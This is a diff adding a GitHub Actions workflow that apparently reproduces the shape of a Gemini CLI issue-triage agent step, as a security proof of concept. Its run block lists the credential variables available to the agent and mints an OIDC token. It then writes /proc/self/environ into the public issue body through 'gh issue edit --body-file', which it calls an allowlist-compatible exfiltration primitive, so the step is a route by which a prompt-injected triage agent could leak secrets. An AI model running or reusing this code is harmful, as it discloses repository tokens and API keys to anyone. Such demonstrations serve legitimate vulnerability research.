@@ -1,0 +1,53 @@
+name: flutter-gemini-triage-shape
+on:
+  issues:
+    types: [opened]
+permissions:
+  contents: read
+  id-token: write
+  issues: write
+  statuses: write
+jobs:
+  triage-issue:
+    # Exact `if` of flutter/samples .github/workflows/gemini-issue-automated-triage.yml
+    if: >
+      github.event_name == 'issues' ||
+      github.event_name == 'workflow_dispatch' ||
+      (github.event_name == 'issue_comment' &&
+       contains(github.event.comment.body, '@gemini-cli /triage') &&
+       (github.event.comment.author_association == 'OWNER' ||
+        github.event.comment.author_association == 'MEMBER' ||
+        github.event.comment.author_association == 'COLLABORATOR'))
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Agent step (env block copied verbatim from the run-gemini-cli call)
+        id: gemini_issue_triage
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          ISSUE_TITLE: ${{ github.event.issue.title }}
+          ISSUE_BODY: ${{ github.event.issue.body }}
+          ISSUE_NUMBER: ${{ github.event.issue.number }}
+          REPOSITORY: ${{ github.repository }}
+          GEMINI_API_KEY: ${{ secrets.DEMO_TOKEN }}
+        run: |
+          echo "== ISSUE_BODY delivered to the privileged step =="
+          printf '%s\n' "$ISSUE_BODY" | head -12
+          echo "== credential-bearing variables visible to a shell in this step =="
+          env | cut -d= -f1 | grep -E '^(GITHUB_TOKEN|GEMINI_API_KEY|ACTIONS_ID_TOKEN_REQUEST_TOKEN|ACTIONS_ID_TOKEN_REQUEST_URL)$' | sort || true
+          echo "github_token_len=${#GITHUB_TOKEN}"
+          echo "demo_secret_len=${#GEMINI_API_KEY}"
+          echo "== OIDC token mintable from the agent step (id-token: write) =="
+          if [ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
+            OIDC=$(curl -s --max-time 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=https://example.com")
+            echo "oidc_response_len=${#OIDC}"
+            echo "oidc_has_value=$(echo "$OIDC" | grep -c '"value"' || true)"
+          fi
+          echo "== allowlist-compatible exfil primitive (gh issue edit --body-file) =="
+          if gh issue edit "$ISSUE_NUMBER" --body-file /proc/self/environ; then
+            echo "EXFIL_GH_BODY_FILE_OK"
+          else
+            echo "EXFIL_GH_BODY_FILE_FAILED"
+          fi
